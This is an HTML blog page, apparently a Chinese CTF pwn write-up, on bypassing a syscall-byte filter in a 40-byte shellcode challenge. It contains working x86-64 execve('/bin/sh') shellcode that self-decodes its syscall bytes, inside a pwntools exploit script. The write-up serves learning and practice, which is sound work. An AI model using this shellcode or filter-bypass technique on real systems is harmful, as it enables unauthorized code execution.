@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 8.1.1">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"whoamiuu.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="Shellcode（Decoder）一、程序分析 checksec保护几乎全开，来看反编译：   程序将 DAT_114514000 地址处的数据强制转换为函数指针并执行。现在问题在于，这里只有40字节布置shellcode，不知道这段区域是否可写可执行，以及filter函数过滤了什么。 下面再分析一下：   OK，看到 0x114514000到0x114515000处可写可执行，但是 **fil">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF题解：shellcode">
+<meta property="og:url" content="http://whoamiuu.github.io/2025/12/09/2025-12-09-week1-Shellcode/index.html">
+<meta property="og:site_name" content="Learn Blogs">
+<meta property="og:description" content="Shellcode（Decoder）一、程序分析 checksec保护几乎全开，来看反编译：   程序将 DAT_114514000 地址处的数据强制转换为函数指针并执行。现在问题在于，这里只有40字节布置shellcode，不知道这段区域是否可写可执行，以及filter函数过滤了什么。 下面再分析一下：   OK，看到 0x114514000到0x114515000处可写可执行，但是 **fil">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://whoamiuu.github.io/images/shellcode/checksec.png">
+<meta property="og:image" content="http://whoamiuu.github.io/images/shellcode/main1.png">
+<meta property="og:image" content="http://whoamiuu.github.io/images/shellcode/main2.png">
+<meta property="og:image" content="http://whoamiuu.github.io/images/shellcode/vmmap.png">
+<meta property="og:image" content="http://whoamiuu.github.io/images/shellcode/filter.png">
+<meta property="og:image" content="http://whoamiuu.github.io/images/shellcode/xgx.png">
+<meta property="article:published_time" content="2025-12-09T02:29:00.000Z">
+<meta property="article:modified_time" content="2025-12-10T05:49:25.509Z">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="shellcode">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://whoamiuu.github.io/images/shellcode/checksec.png">
+
+
+<link rel="canonical" href="http://whoamiuu.github.io/2025/12/09/2025-12-09-week1-Shellcode/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://whoamiuu.github.io/2025/12/09/2025-12-09-week1-Shellcode/","path":"2025/12/09/2025-12-09-week1-Shellcode/","title":"CTF题解：shellcode"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>CTF题解：shellcode | Learn Blogs</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Learn Blogs</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">二进制安全学习笔记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Shellcode%EF%BC%88Decoder%EF%BC%89"><span class="nav-number">1.</span> <span class="nav-text">Shellcode（Decoder）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="nav-number">1.1.</span> <span class="nav-text">一、程序分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B"><span class="nav-number">1.2.</span> <span class="nav-text">二、调试过程</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name"></p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">11</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">categories</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://whoamiuu.github.io/2025/12/09/2025-12-09-week1-Shellcode/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Learn Blogs">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="CTF题解：shellcode | Learn Blogs">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CTF题解：shellcode
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2025-12-09 10:29:00" itemprop="dateCreated datePublished" datetime="2025-12-09T10:29:00+08:00">2025-12-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2025-12-10 13:49:25" itemprop="dateModified" datetime="2025-12-10T13:49:25+08:00">2025-12-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Writeup/" itemprop="url" rel="index"><span itemprop="name">Writeup</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="Shellcode（Decoder）"><a href="#Shellcode（Decoder）" class="headerlink" title="Shellcode（Decoder）"></a>Shellcode（Decoder）</h1><h2 id="一、程序分析"><a href="#一、程序分析" class="headerlink" title="一、程序分析"></a>一、程序分析</h2><p><img src="/images/shellcode/checksec.png" alt="image-20251209102926831"></p>
+<p>checksec保护几乎全开，来看反编译：</p>
+<p><img src="/images/shellcode/main1.png"></p>
+<p><img src="/images/shellcode/main2.png" alt="image-20251209111737923"></p>
+<p><strong>程序将 <code>DAT_114514000</code> 地址处的数据强制转换为函数指针并执行</strong>。现在问题在于，这里只有40字节布置shellcode，不知道这段区域是否可写可执行，以及filter函数过滤了什么。</p>
+<p>下面再分析一下：</p>
+<p><img src="/images/shellcode/vmmap.png"></p>
+<p><img src="/images/shellcode/filter.png" alt="image-20251209114310555"></p>
+<p>OK，看到 <strong>0x114514000到0x114515000处可写可执行</strong>，但是 **filter 会将连续的 \x0f\x05（<code>syscall</code> 指令的机器码） 转为 \0 **，现在的问题变成了如何绕过 syscall 的检查。</p>
+<p>因为这里只有 <code>\x0f\x05</code> 的过滤，我们可以尝试构造<strong>减1的编码规则，即让 <code>\x0f\x05</code> 变为 <code>\x0e\x04</code></strong>，再通过构造解码器解码syscall，从而绕过syscall过滤。</p>
+<h2 id="二、调试过程"><a href="#二、调试过程" class="headerlink" title="二、调试过程"></a>二、调试过程</h2><p>我们在 filter 和 0x114514000 后面下断点，随便发送40个字符</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb.attach(p, <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b *filter</span></span><br><span class="line"><span class="string">b *0x114514000</span></span><br><span class="line"><span class="string">c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/shellcode/xgx.png" alt="image-20251209212032233"></p>
+<p>可以看到全部落在了 0x114514000 区域，多运行几次发现，尽管有pie，这片区域地址不变。并且在执行0x114514000 区域前，0x114514000 会被加载到 rax 里，我们可以利用 rax 来计算要解码的 syscall 地址</p>
+<p>exp如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./shellcode&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode =  <span class="string">b&quot;\x48\x31\xff&quot;</span>                                <span class="comment"># xor rdi, rdi </span></span><br><span class="line">shellcode += <span class="string">b&quot;\x57&quot;</span>                                        <span class="comment"># push rdi</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x00&quot;</span>    <span class="comment"># mov rdi, 0x68732f6e69622f2f</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x57&quot;</span>                                        <span class="comment"># push rdi</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x48\x89\xe7&quot;</span>                                <span class="comment"># mov rdi, rsp</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x48\x31\xf6&quot;</span>                                <span class="comment"># xor rsi, rsi </span></span><br><span class="line">shellcode += <span class="string">b&quot;\x48\x31\xd2&quot;</span>                                <span class="comment"># xor rdx, rdx </span></span><br><span class="line">shellcode += <span class="string">b&quot;\xfe\x40\x21&quot;</span>                                <span class="comment"># inc byte [rax + 0x20]</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xfe\x40\x22&quot;</span>                                <span class="comment"># inc byte [rax +0x21]                                  </span></span><br><span class="line">shellcode += <span class="string">b&quot;\x6a\x3b\x58&quot;</span>                                <span class="comment"># push 0x3b; pop rax</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x0e\x04&quot;</span>                                    <span class="comment"># 编码后的 syscall</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;shellcode: <span class="subst">&#123;<span class="built_in">len</span>(shellcode)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p, &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#b *filter</span></span><br><span class="line"><span class="comment">#b *0x114514018</span></span><br><span class="line"><span class="comment">#c</span></span><br><span class="line"><span class="comment">#&#x27;&#x27;&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Please input your shellcode: \n&quot;</span>)</span><br><span class="line">p.send(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+              <a href="/tags/shellcode/" rel="tag"># shellcode</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/12/08/2025-12-08-onlyfgets/" rel="prev" title="CTF题解：onlyfgets">
+                  <i class="fa fa-angle-left"></i> CTF题解：onlyfgets
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2025/12/10/2025-12-16-Vuln-Random-Seed/" rel="next" title="CTF题解：vuln">
+                  CTF题解：vuln <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder"></span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
